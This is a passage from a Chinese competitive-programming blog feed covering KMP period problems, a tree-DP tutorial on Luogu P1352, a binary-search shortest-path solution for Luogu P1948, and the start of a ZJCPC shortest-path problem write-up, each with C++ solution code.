class="line">-1 0 0 0 1 2 3</span><br></pre></td></tr></table></figure><p>这里为什么多出一个3，因为匹配完成之后还得跳失配指针。这里可能不明显，但是你多写几个就会发现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aabaabaabaabaabaabaabaabaabaab</span><br><span class="line">-1 0 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13……</span><br></pre></td></tr></table></figure><p>结果已经显而易见了，我只要取得最后的next值，然后拿n减去它就可以算出循环大小了。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005 </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> ss[maxn];</span><br><span class="line"><span class="keyword">int</span> kmp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P4391_3.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,ss);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> p=kmp[i];</span><br><span class="line">        <span class="keyword">while</span>(ss[i]!=ss[p]&amp;&amp;p)&#123;</span><br><span class="line">            p=kmp[p];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ss[i]==ss[p])&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=p+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    for(int i=0;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">//        printf(&quot;%d &quot;,kmp[i]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n-kmp[n]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="洛谷P3435"><a href="#洛谷P3435" class="headerlink" title="洛谷P3435"></a><a href="https://www.luogu.com.cn/problem/P3435">洛谷P3435</a></h3><p>就是算出所有前缀的最长可表示周期，并且这个周期长度应该小于这个前缀。</p><p>这个怎么说呢，就是假如 $aaaaa$ 它会由哪个周期构成呢？结果有很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">aa</span><br><span class="line">aaa</span><br><span class="line">aaaa</span><br></pre></td></tr></table></figure><p>以上都可以成为它的周期。</p><p>因为我们要找最长的所以说呢就选 $aaaa$ 。</p><p>但是有一种情况是例外的，就是 $aabaa$ 这个就有点不一样了，它看上去好像是 $aab$ 最大周期，但是它最大周期可以到 $aaba$ ，所以呢我们特判一下最后一个字符和第一个一不一样，一样就直接 $n-1$ 就-好了。</p><p>然后就是遍历整个 $next$ 数组。不过为了保证最长，我们还需要跳 $fail$，跳到不为0的时候即是最大周期，防止重复跳可以加一个优化，跳了之后直接把next值改掉，改成指向最终位置。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> kmp[maxn];</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> p=kmp[i];</span><br><span class="line">        <span class="keyword">while</span>(s[p]!=s[i]&amp;&amp;p)&#123;</span><br><span class="line">            p=kmp[p];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[p]==s[i])&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=p+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            kmp[i+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kmp[i+<span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==s[<span class="number">0</span>])&#123;</span><br><span class="line">                ans+=i;</span><br><span class="line">                <span class="comment">//printf(&quot;%d&#x27;s ans=%d\n&quot;,i,i);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">int</span> x=kmp[i+<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> q=i+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(kmp[x]!=<span class="number">0</span>)&#123;</span><br><span class="line">                    x=kmp[x];</span><br><span class="line">                &#125;</span><br><span class="line">                kmp[q]=x;</span><br><span class="line">                ans+=i-x+<span class="number">1</span>;</span><br><span class="line">                <span class="comment">//printf(&quot;%d&#x27;s ans=%d\n&quot;,i,i-x+1);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 字符串 </category>
          
          <category> KMP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>树形dp的学习</title>
      <link href="/2022/02/14/%E6%A0%91%E5%BD%A2dp%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/02/14/%E6%A0%91%E5%BD%A2dp%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>很烦啊，最近复习图论，贼艰难，很多题目基本多多少少都要用树形dp。而我专注于搞图论和数据结构，dp完全就是略知一二，逃避没有用，不会就去学，碰到困难就去面对。</p><span id="more"></span><p>树上dp其实跟普通的dp差不多，甚至会比普通的dp写起来简单，但是前提是要理解。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>洛谷<a href="https://www.luogu.com.cn/problem/P1352">P1352</a>这个真的是典中典了，我看几乎所有的技术博客都会拿这个当作树形dp的入门题，那我也不例外。</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>某大学有 $n$ 个职员，编号为 $1\ldots n$。</p><p>他们之间有从属关系，也就是说他们的关系就像一棵以校长为根的树，父结点就是子结点的直接上司。</p><p>现在有个周年庆宴会，宴会每邀请来一个职员都会增加一定的快乐指数 $r_i$，但是呢，如果某个职员的直接上司来参加舞会了，那么这个职员就无论如何也不肯来参加舞会了。</p><p>所以，请你编程计算，邀请哪些职员可以使快乐指数最大，求最大的快乐指数。</p><hr><p>其实我觉得这个跟有依赖的背包题有异曲同工之妙，不通的是，他们不是依赖，而是互斥，选了一个人之后则不能选另一个人。而依赖背包则是选了一个则必须选另外一个，当然另外一个没有这个限制，否则两个物品直接合并一个物品啦。</p><p>这里很明显就是 $n$ 个人 $n-1$ 对关系，可以算做一棵树，但是这棵树是有向的，最顶级的那个上司就是树根了。这里我们肯定得先建一个有向图来保存这个关系，然后我们需要自底向上分析策略。对于每一个叶子节点，它们没有下级，对他们来说只有参加或者不参加，这里我们设 $dp[i][0]$ 为第 $i$ 个人不来参加的最优解，$dp[i][1]$ 为第 $i$ 个人来参加的最优解，注意这个最优解是对于它以及它的所有子孙节点的最优解。我们假设节点 $i$ 有k个节点分别为 $a_1,a_2\dots a_k$ ，那么可以写出如下状态转移方程。 </p><p>$dp[i][1]  = \sum _{x=1} ^{k} dp[a_x][0]$</p><p>$dp[i][0]  = \sum _{x=1} ^{k} \max(dp[a_x][0],dp[a_x][1])$</p><p>这里很明显，对于本人不参加，那么自己的下属可参加可不参加，但是自己参加了自己的下属一定不能参加，而自己不参加选择下属参加还是不参加也是选取最优结果的，因此能得到上面的状态转移方程。然后就是最基本的树的操作了：建边，找根，dfs，状态转移，最后结果就是 $\max(dp[root][1],dp[root][0])$，所以这道题是真的入门题。</p><h4 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 6500</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn];</span><br><span class="line"><span class="keyword">int</span> root[maxn],degree[maxn],cnt,n,dp[maxn][<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    degree[y]++;</span><br><span class="line">    edge[++cnt].next=root[x];</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[x];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="built_in">dfs</span>(v);</span><br><span class="line">        dp[x][<span class="number">0</span>]+=<span class="built_in">max</span>(dp[v][<span class="number">1</span>],dp[v][<span class="number">0</span>]);<span class="comment">//状态转移方程</span></span><br><span class="line">        dp[x][<span class="number">1</span>]+=dp[v][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;dp[i][<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="built_in">add</span>(y,x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!degree[i])&#123;<span class="comment">//找根</span></span><br><span class="line">            <span class="built_in">dfs</span>(i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">max</span>(dp[i][<span class="number">1</span>],dp[i][<span class="number">0</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 动态规划 </category>
          
          <category> 树形dp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P1948题解</title>
      <link href="/2022/02/13/%E6%B4%9B%E8%B0%B7P1948%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/13/%E6%B4%9B%E8%B0%B7P1948%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P1948">洛谷P1948</a>题解。</p><span id="more"></span><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>多年以后，笨笨长大了，成为了电话线布置师。由于地震使得某市的电话线全部损坏，笨笨是负责接到震中市的负责人。该市周围分布着$N(1&lt;=N&lt;=1000)$根据$1……n$顺序编号的废弃的电话线杆，任意两根线杆之间没有电话线连接，一共有$p(1&lt;=p&lt;=10000)$对电话杆可以拉电话线。其他的由于地震使得无法连接。</p><p>第i对电线杆的两个端点分别是$a_i,b_i$，它们的距离为$l_i(1&lt;=l_i&lt;=1000000)$。数据中每对$(a_i,b_i)$只出现一次。编号为1的电话杆已经接入了全国的电话网络，整个市的电话线全都连到了编号N的电话线杆上。也就是说，笨笨的任务仅仅是找一条将1号和N号电线杆连起来的路径，其余的电话杆并不一定要连入电话网络。</p><p>电信公司决定支援灾区免费为此市连接k对由笨笨指定的电话线杆，对于此外的那些电话线，需要为它们付费，总费用决定于其中最长的电话线的长度(每根电话线仅连接一对电话线杆)。如果需要连接的电话线杆不超过k对，那么支出为0.</p><p>请你计算一下，将电话线引导震中市最少需要在电话线上花多少钱？</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>有一说一，不看题解我是万万想不到的，这得是多厉害猜想得到这题是用二分去解决的。不过如果能发现这题的答案的单调性，也许真的可以写出来。</p><p>首先第一点我想的肯定就是最短路啦，但是本题目求的并不是最短路，仔细看，如果路线个数少于 $k$ 个，则0元购，否则将会取得所有路线的最长的一条路径作为费用。可以看到这个题目它并不具备无后效性，它属于有后效性，有后效性即前面做出的选择对之后的选择有影响，如果题目就是求总共的最短路那么它就是无后效性。因为我当前在一个点上的时候你不需要去管我怎么到的这，因为就一个最短路径的值在这里，不管你前面怎么走的这个值是不会影响后面的结果的。</p><p>那么这是一个有后效性的题目那怎么办呢，答案是二分。</p><p>二分的判断条件就是，在我预算为mid的时候能否成功建成，很容易可以找到规律，如果mid能建成，那么&gt;mid的情况一定能建成，如果mid不能建成，那么&lt;mid的情况一定也不能建成，以此作为二分的依据。我们跑最短路的时候只需要检测路线上有多少个超过mid的边即可，如果超过k，说明预算一定超过mid，如果没到，说明预算太多了，大于mid的答案就都排除了，然后每次二分跑一次单源最短路。在 $n=1000$ 的情况下复杂度完全允许。</p><p>就是说，还得多练习，不然完全想不到能用这样的方法去做。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 5005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn*maxn*<span class="number">2</span>];</span><br><span class="line"> <span class="keyword">int</span> n,m,k,cnt,root[maxn],d[maxn],vis[maxn];</span><br><span class="line"> priority_queue&lt;P,vector&lt;P&gt;,greater&lt;P&gt;&gt;s;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].next=root[x];</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(d,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(d));</span><br><span class="line">    <span class="comment">//memset(vis,0,sizeof(vis));</span></span><br><span class="line">    d[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//vis[1]=1;</span></span><br><span class="line">    s.<span class="built_in">push</span>(&#123;<span class="number">0</span>,<span class="number">1</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> p=s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> point=p.second;</span><br><span class="line">        <span class="keyword">if</span>(d[point]&lt;p.first)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[point];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(vis[to])<span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//vis[to]=1;</span></span><br><span class="line">            <span class="keyword">if</span>(d[to]&gt;d[point]+(edge[i].w&gt;x?<span class="number">1</span>:<span class="number">0</span>))&#123;</span><br><span class="line">                <span class="comment">//vis[to]=1;</span></span><br><span class="line">                d[to]=d[point]+(edge[i].w&gt;x?<span class="number">1</span>:<span class="number">0</span>);</span><br><span class="line">                s.<span class="built_in">push</span>(&#123;d[to],to&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;mid=%d:d[n]=%d\n&quot;,x,d[n]);</span></span><br><span class="line"><span class="comment">//    for(int i=1;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">//        printf(&quot;%d &quot;,d[i]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//putchar(10);</span></span><br><span class="line">    <span class="keyword">if</span>(d[n]==INF)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(d[n]&gt;k)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P1948_2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">1</span>,r=<span class="number">1000000</span>,ans=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> value=<span class="built_in">bfs</span>(mid);</span><br><span class="line">        <span class="keyword">if</span>(value==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(value==<span class="number">1</span>)&#123;</span><br><span class="line">            l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r=mid<span class="number">-1</span>;</span><br><span class="line">            ans=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 最短路径 </category>
          
          <category> algorithm </category>
          
          <category> 二分 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZJCPC-D. Shortest Path Query</title>
      <link href="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>今天来复盘一下上次省赛考到的题目，异常地折磨人。</p><span id="more"></span><p>先说一下这题比赛的情况吧，基本上呢，银奖中等偏上的队伍都是做出来了的。</p><p>那我们就看看这题吧。</p><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><p>什么思路在题目名字这里就一目了然了，那自然是最短路径。</p><p>而当我一眼扫过去看到这个数据量的时候瞬间惊呆。$1≤n≤100000，1≤m≤200000$，不仅如此，还有 $q$ 次询问最短路径，$q≤200000$ 当时一看，这玩你妈。给一个点都勉强能过了，这有这么多点，如果按照常规思路，一次单源最短路径复杂度 $nlog_2n$ 然后 $q$ 次询问，总复杂度就是 $qnlog_2n$ 全部以最大值带进去妥妥的超时。所以当时比赛的时候看到这个题目是直接放弃了的，而且英文不好的我留下了悔恨的眼泪。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>但是它还有一个条件，那就是，直接相连的两个点当中，其中一个点的编号一定是另一个点的二进制前缀，这就说明了一点，$2$ 它一定不会跟 $3,6,12……$ 等点连接起来的，因为它们的前缀是 $11_{2}$，而 $2_{10}$ 是 $10_{2}$ 开头的，那么这样的话我们就可以构造一棵 $tire$ 树。像这样子。</p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/2.png" alt="2"></p><p>可以很明显的看出来是一个完全二叉树，这里我们假设往左子树走二进制右添一个 $0$，向左走二进制右添一个 $1$。那你可能会想，这明明边的范围是比点多的，怎么可能是一棵树。没错，但是我们看看，它能不能边横向添加？答案当然是否定的，因为一个得是另一个的前缀，同层次的话二进制位数相同，但是实际值不同，因此不可能满足这个条件。那么我们看看能不能连到其它不是我的祖先的节点呢？答案当然还是否定的，因为我简历的 $tire$ 就是根据二进制后面添 $0$ 还是添 $1$ 来确定分支的，如果你都不是由我在后面添 $0$ 或者是添 $1$ 得到的那你就不可能是我的前缀，也不是我的孙子节点。</p><p>当然在图中 $1$ 和 $4$ 是可以直接相连的，虽然越级但是满足条件。所以它严格意义上来说不是树，但它怎么当成树呢？如果我把一个节点两个直接相连的子图当成子树，问题就解决了。因为两个子图之间肯定没有线连接，这个在刚刚已经证明过了。</p><p>对于每一个节点，我们都去寻找它祖先的最短路径。因为一个节点最多有 $log_2n$ 个祖先，所以跑一下最短路算法问题还是不大的。我们定义 $dis[i][k]$ 为节点 $i$ 到达往上 $k$ 